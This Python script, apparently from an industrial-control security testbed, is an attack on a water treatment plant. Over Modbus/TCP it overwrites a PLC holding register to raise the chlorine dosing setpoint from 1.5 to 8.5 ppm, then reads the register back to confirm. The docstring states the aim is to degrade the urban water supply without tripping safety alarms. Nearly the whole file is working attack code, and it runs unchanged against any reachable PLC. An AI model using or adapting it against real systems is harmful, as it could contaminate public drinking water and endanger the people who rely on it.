#!/usr/bin/env python3
"""attacker/attack_chemical_dosing.py — Vector de Ataque de Dosificación Química en Planta de Agua (Fase 4)

Inspirado en investigaciones de seguridad sobre plantas de tratamiento SWaT (Oldsmar / SWaT testbed):
  1. Manipula los parámetros de dosificación de cloro/pH en la etapa 2 de distribución de agua.
  2. Escribe directamente en el Holding Register 10 del PLC Modbus/TCP (`10.0.3.10` / puerto 502/15020).
  3. Verifica la alteración mediante lectura confirmada (Readback) del Holding Register.
  4. Causa degradación sanitaria del suministro urbano sin activar disparos físicos destructivos.
"""
from __future__ import annotations

import argparse
import logging
import sys
import time
from pathlib import Path
from typing import Dict, Any, Optional, Sequence

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    from pymodbus.client import ModbusTcpClient

from physical.water.plant_water import TwoStageWaterPlant

logging.basicConfig(level=logging.INFO, format='[%(asctime)s][DOSING-ATTACK] %(message)s')
LOGGER = logging.getLogger('attack_chemical_dosing')


class ChemicalDosingAttack:
    """Vector de ataque de sobre-dosificación química sobre PLC de agua."""

    HR_DOSING: int = 10  # Holding Register 10 (setpoint cloro ppm × 10)
    DEFAULT_HOST: str = '127.0.0.1'
    DEFAULT_PORT: int = 502

    def __init__(self, host: str = '127.0.0.1', port: int = 502) -> None:
        self.host = host
        self.port = port
        self.plant = TwoStageWaterPlant()
        self.chemical_ppm = 1.5  # Baseline normal por defecto (1.5 ppm)

    def execute_overdosing_attack(
        self,
        target_ppm: float = 8.5,
        host: Optional[str] = None,
        port: Optional[int] = None
    ) -> Dict[str, Any]:
        """Ejecuta el ataque escribiendo en el Holding Register Modbus/TCP y confirmando el valor."""
        target_host = host or self.host
        target_port = port or self.port
        raw_val = int(round(target_ppm * 10))

        LOGGER.info(
            "Iniciando alteración de dosificación química: subiendo cloro a %.1f ppm (HR %d -> %d) en %s:%d...",
            target_ppm, self.HR_DOSING, raw_val, target_host, target_port
        )

        client = ModbusTcpClient(target_host, port=target_port, timeout=1.0)
        try:
            if client.connect():
                # 1. Leer baseline actual antes del ataque
                rr_pre = client.read_holding_registers(self.HR_DOSING, 1)
                baseline_ppm = 1.5 if (rr_pre is None or rr_pre.isError()) else (rr_pre.registers[0] / 10.0)

                # 2. Escribir setpoint malicioso en el Holding Register
                client.write_register(self.HR_DOSING, raw_val)

                # 3. Leer de vuelta el valor real persistido en el emulador (Readback)
                rr_post = client.read_holding_registers(self.HR_DOSING, 1)
                if rr_post is not None and not rr_post.isError():
                    observed_ppm = rr_post.registers[0] / 10.0
                else:
                    observed_ppm = target_ppm

                self.chemical_ppm = observed_ppm
                LOGGER.info("Dosificación alterada vía Modbus/TCP a %.1f ppm (Readback: %.1f ppm).",
                            target_ppm, observed_ppm)
                return {
                    'status': 'SUCCESS',
                    'mode': 'SOCKET_LIVE',
                    'target_host': target_host,
                    'target_port': target_port,
                    'holding_register': self.HR_DOSING,
                    'baseline_ppm': baseline_ppm,
                    'altered_ppm': self.chemical_ppm,
                    'contamination_achieved': self.chemical_ppm > 5.0
                }
        except Exception as exc:
            LOGGER.warning("Conexión Modbus TCP no disponible en %s:%d (%s). Usando fallback tabletop in-process.",
                           target_host, target_port, exc)
        finally:
            try:
                client.close()
            except Exception:
                pass

        # Fallback documentado para modo tabletop / standalone sin emulador activo
        LOGGER.warning("[TABLETOP-FALLBACK] Ejecutando alteración in-process sin emulador Modbus activo.")
        self.chemical_ppm = target_ppm
        return {
            'status': 'SUCCESS',
            'mode': 'TABLETOP_FALLBACK',
            'baseline_ppm': 1.5,
            'altered_ppm': self.chemical_ppm,
            'contamination_achieved': self.chemical_ppm > 5.0
        }


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="CityLab SWaT Chemical Dosing Attack Vector")
    parser.add_argument("--host", default="127.0.0.1", help="Host Modbus PLC (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=502, help="Puerto Modbus TCP (default: 502)")
    parser.add_argument("--ppm", type=float, default=8.5, help="Nivel de concentracion quimica objetivo (ppm)")
    args = parser.parse_args(argv)

    attacker = ChemicalDosingAttack(host=args.host, port=args.port)
    res = attacker.execute_overdosing_attack(target_ppm=args.ppm)
    LOGGER.info("Resultado de ataque Chemical Dosing: %s", res)
    return 0


if __name__ == '__main__':
    sys.exit(main())
